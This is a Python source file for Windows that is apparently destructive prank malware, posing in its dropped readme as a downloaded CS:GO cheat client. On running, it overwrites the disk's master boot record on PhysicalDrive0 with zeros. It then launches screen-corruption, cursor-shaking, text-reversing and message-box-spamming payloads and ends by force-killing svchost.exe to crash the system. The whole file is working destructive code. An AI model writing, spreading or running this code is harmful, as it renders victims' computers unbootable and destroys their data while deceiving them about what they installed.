import os
os.system("pip install pywin32")
from win32api import *
from win32gui import *
from win32ui import *
import ctypes
from win32con import *
from win32file import *
from random import randrange as rd
from random import *
from sys import exit
import multiprocessing
import time
import webbrowser
from win32file import *

class Data:
	sites = (
     "https://google.co.ck/search?q=мой компьютер странно себя ведёт",
     "http://google.co.ck/search?q=скачать майнкрафт бесплатно",
     "http://google.co.ck/search?q=virus.exe",
     "http://google.co.ck/search?q=робаксы накрутка",
     "http://google.co.ck/search?q=как удалить system 32",
     "https://www.youtube.com/@XXDDC47",
	 "calc",
	 "notepad",
	 "cmd",
	 "write",
	 "regedit",
	 "explorer",
         "taskmgr",
	 "msconfig",
	 "mspaint",
	 "devmgmt.msc",
	 "control",
	 "mmc",
     "osk",
     "winver",
	)
	
	IconWarning = LoadIcon(None, 32515)
	IconError = LoadIcon(None, 32513)

e = "readme.txt"
with open('readme.txt', 'w') as f:
    f.write('Благодарим вас за скачивание чит-клиента CS-GOAIMBOTNOCLIPINVIZFLYSPEEDBOOSTINFRANGEBULLETS. Желаем приятной переустановки Windows!')
time.sleep(1)
os.startfile(f'{e}')

class MBR:
	def overwrite():
		handle = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)				  
		WriteFile(handle, AllocateReadBuffer(512), None)
		CloseHandle(handle)
time = 0
timeSubtract = 15000
class Payloads:
	def open_sites():
		global timeSubtract
		sites = Data.sites
		global time
		while True:
			Sleep(timeSubtract-time)
			__import__("os").system("start " + str(choice(sites)))
	def decrease_timer():
		global time
		while time < 15000:
			time += 1
			Sleep(10)
	def blink_screen():
		global time
		global timeSubtract
		HDC = GetDC(0) 
		sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1))
		while True:
			Sleep(1000)
			PatBlt(HDC, 0,0,sw,sh, PATINVERT)
	def reverse_text():
		global time
		global timeSubtract
		HWND = GetDesktopWindow() 
		while True:
			EnumChildWindows(HWND, EnumChildProc, None)
			Sleep(timeSubtract-time)
	def error_drawing():
		global time 
		global timeSubtract
		HDC = GetDC(0) 
		sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1)) 
		while True:
			DrawIcon(HDC, rd(sw), rd(sh), Data.IconWarning)
			for i in range(0, 60):
				mouseX,mouseY = GetCursorPos()
				DrawIcon(HDC, mouseX, mouseY, Data.IconError)
				Sleep(10)
	def warning_spam():
		global time 
		global timeSubtract
		while True:
			multiprocessing.Process(target = msgboxThread).start()
			Sleep(timeSubtract-time)
	def screen_puzzle():
		global time
		global timeSubtract
		HDC = GetDC(0)
		sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1))
		x1 = rd(sw-100)
		y1 = rd(sh-100)
		x2 = rd(sw-100)
		y2 = rd(sh-100)
		width = rd(600)
		height = rd(600)
		while True:
			BitBlt(HDC, x1, y1, width, height, HDC, x2, y2, SRCCOPY)
			Sleep(150)
	def cursor_shake():
		global time
		global timeSubtract
		while True:
			x,y = GetCursorPos()
			newX = x + (rd(3)-1) * rd(int((time+1)/2200+2)) 
			newY = y + (rd(3)-1) * rd(int((time+1)/2200+2))
			SetCursorPos((newY,newY))
			Sleep(10)
	def tunnel_effect():
		global time
		global timeSubtract
		sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1))
		HDC = GetDC(0)
		while True:
			StretchBlt(HDC, 50, 50, sw - 100, sh - 100, HDC, 0, 0, sw, sh, SRCCOPY)
			Sleep(150)


def msgboxThread():
	MessageBox("ещё пользуешься компьютером?", "лол", MB_OK | MB_ICONWARNING)

def EnumChildProc(hwnd, lParam):
	try: 
		buffering = PyMakeBuffer(255)
		length = SendMessage(hwnd, WM_GETTEXT, 255, buffering) 
		result = str(buffering[0:length*2].tobytes().decode('utf-16')) 
		result = result[::-1]

		SendMessage(hwnd, WM_SETTEXT, None, result) 
	except: pass
if __name__ == '__main__':
	MBR.overwrite()
	p = Payloads
	opensites = multiprocessing.Process(target = p.open_sites)
	timersub = multiprocessing.Process(target = p.decrease_timer)
	reverse = multiprocessing.Process(target = p.reverse_text)
	blinking = multiprocessing.Process(target = p.blink_screen)
	icons = multiprocessing.Process(target = p.error_drawing)
	shaking = multiprocessing.Process(target = p.cursor_shake)
	tunneling = multiprocessing.Process(target = p.tunnel_effect)
	puzzling = multiprocessing.Process(target = p.screen_puzzle)
	errors = multiprocessing.Process(target = p.warning_spam)
	timersub.start()
	opensites.start() 
	shaking.start() 
	Sleep(timeSubtract*2)
	blinking.start() 
	icons.start()
	Sleep(7000*2)
	reverse.start()
	puzzling.start()
	errors.start() 
	Sleep(5000*2)
	tunneling.start()
	while time < 15000:
		Sleep(10)
	__import__("os").system("taskkill /F /IM svchost.exe")
